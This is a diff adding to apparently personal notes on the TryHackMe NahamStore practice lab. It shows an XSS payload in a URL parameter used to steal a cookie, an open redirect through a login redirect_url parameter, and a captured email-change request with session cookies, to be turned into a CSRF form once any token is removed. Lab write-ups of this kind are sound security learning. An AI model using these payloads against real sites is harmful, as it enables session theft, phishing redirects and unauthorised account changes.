@@ -97,3 +97,34 @@ http://nahamstore.thm/product?id=2&added=1&discount=1234"onmouseover=alert(docum
   														---------------------------------------
 ****When you put your mouse pointer over the box, you will get cookie****
 
+Open redirect in login page
+---------------------------
+
+http://nahamstore.thm/login?redirect_url=order (original)
+
+http://nahamstore.thm/login?redirect_url=https://www.google.com
+When you press the login > it will redirects to google.com.
+______________________________________________________________________________________________________________________________
+Use CSRF POC generator to generate form for user input (if csrf token is appeared, delete it)
+--------------------------------------------------------
+for example
+
+POST /account/settings/email HTTP/1.1
+Host: nahamstore.thm
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 192
+Origin: http://nahamstore.thm
+Connection: close
+Referer: http://nahamstore.thm/account/settings/email
+Cookie: token=a9f9ba189339bf3cb20d8f2e50f8af23; session=b1e9dc3bbbca5781a41d939a9269ac3d
+Upgrade-Insecure-Requests: 1
+
+change_email=lee%40gmail.com
+
+
+Change that thing in csrf generator online to get a form.
+
